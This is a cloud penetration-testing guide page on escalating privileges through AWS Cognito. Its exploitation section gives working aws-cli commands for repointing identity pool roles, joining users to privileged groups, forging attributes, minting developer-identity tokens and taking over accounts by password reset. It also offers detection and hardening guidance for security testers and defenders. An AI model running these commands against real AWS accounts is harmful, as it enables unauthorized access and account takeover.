---
cstg_id: CSTG-AWS-COGNITO-PRIVESC
title: "AWS Cognito - Privilege Escalation"
provider: aws
service: cognito
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - cognito-idp:AdminCreateUser
  - cognito-idp:AdminSetUserPassword
  - cognito-idp:AdminAddUserToGroup
  - cognito-idp:AdminUpdateUserAttributes
  - cognito-idp:CreateGroup
  - cognito-idp:UpdateGroup
  - cognito-idp:AdminInitiateAuth
  - cognito-idp:UpdateUserPool
  - cognito-idp:UpdateUserPoolClient
  - cognito-idp:CreateUserPoolClient
  - cognito-identity:SetIdentityPoolRoles
  - cognito-identity:UpdateIdentityPool
  - cognito-identity:GetCredentialsForIdentity
  - cognito-identity:GetOpenIdTokenForDeveloperIdentity
  - iam:PassRole
  - sts:AssumeRoleWithWebIdentity
tools:
  - aws-cli
  - pacu
  - jq
references:
  - "https://docs.aws.amazon.com/cognito/latest/developerguide/role-based-access-control.html"
  - "https://docs.aws.amazon.com/cognito/latest/developerguide/identity-pools-tokens-roles.html"
  - "https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_SetIdentityPoolRoles.html"
  - "https://docs.aws.amazon.com/cognito-user-identity-pools/latest/APIReference/API_AdminAddUserToGroup.html"
  - "https://docs.aws.amazon.com/cognito-user-identity-pools/latest/APIReference/API_AdminSetUserPassword.html"
  - "https://hackingthe.cloud/aws/exploitation/cognito_identity_pool_excessive_privileges/"
  - "https://rhinosecuritylabs.com/aws/aws-iam-privilege-escalation-methods-mitigation/"
license: CC BY-SA 4.0
---

## Summary

This page covers privilege escalation **through** Amazon Cognito from an assumed-breach position - a principal that already holds some Cognito and/or IAM permissions and uses them to obtain a more privileged identity or AWS credential set. Cognito is a powerful privilege-escalation surface because it is, by design, a machine that converts identities into IAM roles via STS. Whoever can influence *which* role a Cognito identity receives - by editing role mappings, by joining a user to a role-bearing group, by minting users/passwords, or by passing a role to a new pool - can escalate to that role's permissions.

Each `### <permission>` subsection below describes a path enabled by a specific permission (or tight combination). The attacker objective throughout is to move from the current principal's effective rights to the rights of a more privileged IAM role that Cognito issues or can be made to issue.

## Prerequisites

- **Access level:** Assumed breach - valid AWS credentials with one or more of the Cognito/IAM permissions listed in the frontmatter, plus the ability to authenticate to a User Pool / call Identity Pool APIs.
- **Recon dependency:** complete the [Cognito enumeration](../02-services/aws-cognito-enum.md) first to know the User Pool IDs, app client IDs, Identity Pool IDs, group `RoleArn`s, role mappings, and the IAM permissions behind each role - the escalation target is whichever issued role is more privileged than the current principal.

## Misconfigurations & Findings

- A more privileged IAM role is reachable as an Identity Pool authenticated/unauthenticated role, a group `RoleArn`, or a `RoleMappings` target.
- The current principal holds a single "harmless-looking" Cognito write permission (e.g. `AdminAddUserToGroup`, `AdminSetUserPassword`, `SetIdentityPoolRoles`, `UpdateGroup`) that influences role assignment.
- `iam:PassRole` is held over a privileged role, allowing it to be wired into a new/edited pool, group, or role mapping.
- Role trust policies lack tight `aud`/`amr` conditions, so a token from a pool the attacker controls can assume them.
- Developer-authenticated identities are enabled, letting a holder of `GetOpenIdTokenForDeveloperIdentity` mint tokens for arbitrary identities.

## Exploitation

### cognito-identity:SetIdentityPoolRoles

The most direct path. This permission lets the caller rewrite which IAM role an Identity Pool hands out. Point the authenticated (or unauthenticated) role at any role the pool's roles can assume - ideally a highly privileged one whose trust policy allows `cognito-identity.amazonaws.com` - then obtain credentials for it.

```bash
# Repoint the pool's authenticated role to a privileged target role
aws cognito-identity set-identity-pool-roles \
  --identity-pool-id us-east-1:1234...-...789012 \
  --roles authenticated=arn:aws:iam::111122223333:role/PrivilegedTargetRole \
  --region us-east-1

# Then authenticate (or self-register) to the linked pool, and exchange the token
aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:aaaa.... \
  --logins cognito-idp.us-east-1.amazonaws.com/us-east-1_AbCdEf123=<IdToken> \
  --region us-east-1
```

If `iam:PassRole` is also required by policy for the target role, hold it (see below). The new credentials carry the target role's permissions.

### cognito-identity:UpdateIdentityPool

Enables (or re-enables) `AllowUnauthenticatedIdentities` and can attach federated providers the attacker controls. Combined with `SetIdentityPoolRoles`, it widens who can reach the issued roles - e.g. turning on guest access to obtain credentials with no token at all.

```bash
aws cognito-identity update-identity-pool \
  --identity-pool-id us-east-1:1234...-...789012 \
  --identity-pool-name AppPool \
  --allow-unauthenticated-identities --region us-east-1
```

### cognito-idp:AdminAddUserToGroup

If a User Pool group has a privileged `RoleArn` (token-based RBAC), adding a controlled user to that group makes that user's tokens select the group's role. Authenticate as the user and exchange the token through the Identity Pool for the group's role credentials.

```bash
aws cognito-idp admin-add-user-to-group \
  --user-pool-id us-east-1_AbCdEf123 \
  --username attacker@evil.example --group-name Admins --region us-east-1

# Re-authenticate to refresh tokens with the new cognito:groups / role claim,
# then GetCredentialsForIdentity with the fresh IdToken -> Admins role
```

### cognito-idp:CreateGroup / cognito-idp:UpdateGroup

With `CreateGroup`/`UpdateGroup` (and `iam:PassRole` over the target role), create or modify a group whose `RoleArn` points at a privileged role and whose `Precedence` wins resolution, then join a controlled user to it.

```bash
aws cognito-idp create-group --group-name pwn \
  --user-pool-id us-east-1_AbCdEf123 \
  --role-arn arn:aws:iam::111122223333:role/PrivilegedTargetRole \
  --precedence 1 --region us-east-1
```

### cognito-idp:AdminCreateUser + cognito-idp:AdminSetUserPassword

Mint a fully controlled, confirmed user (bypassing public sign-up restrictions) and set a permanent password, giving a stable authenticated identity to feed into the group/role-mapping paths. `AdminSetUserPassword --permanent` also enables **account takeover** of an existing username by resetting its password.

```bash
aws cognito-idp admin-create-user --user-pool-id us-east-1_AbCdEf123 \
  --username pwn --message-action SUPPRESS --region us-east-1
aws cognito-idp admin-set-user-password --user-pool-id us-east-1_AbCdEf123 \
  --username pwn --password 'Str0ng#Passw0rd!' --permanent --region us-east-1

# Account takeover of an existing user:
aws cognito-idp admin-set-user-password --user-pool-id us-east-1_AbCdEf123 \
  --username victim@example.com --password 'Att@ckerPass1!' --permanent --region us-east-1
```

### cognito-idp:AdminUpdateUserAttributes

If authorization (in the app or in a PreTokenGeneration trigger / `RoleMappings` rule) keys off a user attribute - e.g. a custom `role`/`tier` claim, or `email`/`email_verified` - rewriting that attribute on a controlled user escalates the role/claims their tokens carry, or impersonates a trusted email for downstream apps.

```bash
aws cognito-idp admin-update-user-attributes --user-pool-id us-east-1_AbCdEf123 \
  --username pwn \
  --user-attributes Name=custom:role,Value=admin Name=email_verified,Value=true \
  --region us-east-1
```

### cognito-idp:UpdateUserPoolClient / cognito-idp:CreateUserPoolClient

Create or modify an app client to enable weak/abusable auth flows (`ALLOW_USER_PASSWORD_AUTH`, `ALLOW_ADMIN_USER_PASSWORD_AUTH`), remove `PreventUserExistenceErrors`, broaden `WriteAttributes` (so the user can self-set the attributes abused above), or change token validity/OAuth scopes - lowering the barrier to the other paths.

```bash
aws cognito-idp update-user-pool-client --user-pool-id us-east-1_AbCdEf123 \
  --client-id 1example23clientid456789ab \
  --explicit-auth-flows ALLOW_USER_PASSWORD_AUTH ALLOW_REFRESH_TOKEN_AUTH \
  --write-attributes custom:role email --region us-east-1
```

### cognito-idp:UpdateUserPool

Pool-wide changes that enable escalation of the auth surface: attach or modify Lambda triggers (e.g. a PreTokenGeneration trigger the attacker controls to inject `cognito:roles`/`cognito:preferred_role` claims), loosen the password policy, or change auto-verified attributes. A controlled PreTokenGeneration trigger can directly forge the claims that `RoleMappings` use to pick a role.

### cognito-identity:GetOpenIdTokenForDeveloperIdentity

With developer-authenticated identities enabled, this permission lets the caller mint an OpenID token for an arbitrary `IdentityId`/developer-provider login without proving the end user's identity. The token is then exchanged for the pool's authenticated role - effectively impersonating any user of the pool.

```bash
aws cognito-identity get-open-id-token-for-developer-identity \
  --identity-pool-id us-east-1:1234...-...789012 \
  --logins login.myapp.example=any-user-id --region us-east-1
# -> { "IdentityId": "...", "Token": "<jwt>" }

aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::111122223333:role/Cognito_PoolAuth_Role \
  --role-session-name dev --web-identity-token <jwt> --region us-east-1
```

### iam:PassRole + sts:AssumeRoleWithWebIdentity

`iam:PassRole` is the enabler for several paths above: it is what lets a privileged role be attached to a new/edited Identity Pool role mapping, group `RoleArn`, or app client. Where a role's trust policy already permits `cognito-identity.amazonaws.com` web-identity federation with loose/absent `aud`/`amr` conditions, a token minted from any controllable pool can assume it directly via `sts:AssumeRoleWithWebIdentity` - no further Cognito write needed.

## Detection & Logging

- **High-signal CloudTrail events** (treat as critical, alert in near-real-time):
  - `cognito-identity:SetIdentityPoolRoles`, `UpdateIdentityPool` - role-mapping / guest-access changes.
  - `cognito-idp:CreateGroup`, `UpdateGroup`, `AdminAddUserToGroup` - especially when a `RoleArn` is involved.
  - `cognito-idp:AdminCreateUser`, `AdminSetUserPassword`, `AdminUpdateUserAttributes` - admin user manipulation / takeover.
  - `cognito-idp:UpdateUserPool`, `UpdateUserPoolClient`, `CreateUserPoolClient` - auth-flow / trigger / attribute changes.
  - `cognito-identity:GetOpenIdTokenForDeveloperIdentity` from unexpected principals.
- **Credential issuance and use:** `GetCredentialsForIdentity` / `AssumeRoleWithWebIdentity` followed by activity under a privileged `assumed-role/...` ARN that does not match the role's normal usage pattern.
- **Correlation:** an `iam:PassRole` of a privileged role co-occurring with a Cognito write that references that role ARN is a strong escalation indicator.
- **Managed detections:** GuardDuty flags anomalous role assumption and privilege-escalation-style API sequences; CloudTrail Insights surfaces unusual rates of these management events. Cognito advanced security logs anomalous admin actions.

## Remediation & Hardening

- **Least privilege on Cognito control-plane permissions.** Treat `SetIdentityPoolRoles`, `UpdateIdentityPool`, `CreateGroup`/`UpdateGroup`, `AdminAddUserToGroup`, `AdminCreateUser`, `AdminSetUserPassword`, `AdminUpdateUserAttributes`, `UpdateUserPool`/`UpdateUserPoolClient`, and `GetOpenIdTokenForDeveloperIdentity` as privileged; grant only to dedicated administrative principals.
- **Constrain `iam:PassRole`** with `Condition` keys (`iam:PassedToService = cognito-identity.amazonaws.com` and resource scoping) so privileged roles cannot be wired into pools/groups.
- **Tighten role trust policies.** Every Cognito-assumable role's trust policy must condition on `cognito-identity.amazonaws.com:aud` (the exact Identity Pool ID) and `:amr` (`authenticated`); avoid wildcard principals.
- **Scope the issued roles to least privilege** so that even if mapping is abused, the gained role is low value.
- **Prefer enhanced flow with strict role mapping**; avoid `AmbiguousRoleResolution=AuthenticatedRole`. Do not select roles from user-controllable attributes; validate claims set by Lambda triggers.
- **Lock down custom attributes** that drive authorization - mark them non-mutable / not user-writable; never trust client-settable attributes for access decisions.
- **Enable advanced security / threat protection** and alert on all the control-plane events listed above; review `SetIdentityPoolRoles` and group `RoleArn` changes as change-controlled operations.

## Tools

- **aws-cli + jq** - execute and parse the control-plane operations above.
- **Pacu** - Cognito enumeration and privilege-escalation modules automate role-mapping abuse, group manipulation, and credential exchange.
- **IAM policy analyzers / privilege-escalation scanners** - identify which issued roles are more privileged than the current principal and which trust policies are loosely conditioned.

## References

- Role-based access control with Cognito - <https://docs.aws.amazon.com/cognito/latest/developerguide/role-based-access-control.html>
- Identity pools: tokens and roles - <https://docs.aws.amazon.com/cognito/latest/developerguide/identity-pools-tokens-roles.html>
- `SetIdentityPoolRoles` API reference - <https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_SetIdentityPoolRoles.html>
- `AdminAddUserToGroup` API reference - <https://docs.aws.amazon.com/cognito-user-identity-pools/latest/APIReference/API_AdminAddUserToGroup.html>
- `AdminSetUserPassword` API reference - <https://docs.aws.amazon.com/cognito-user-identity-pools/latest/APIReference/API_AdminSetUserPassword.html>
- Hacking the Cloud - Cognito Identity Pool excessive privileges - <https://hackingthe.cloud/aws/exploitation/cognito_identity_pool_excessive_privileges/>
- Rhino Security Labs - AWS IAM privilege escalation methods and mitigation - <https://rhinosecuritylabs.com/aws/aws-iam-privilege-escalation-methods-mitigation/>
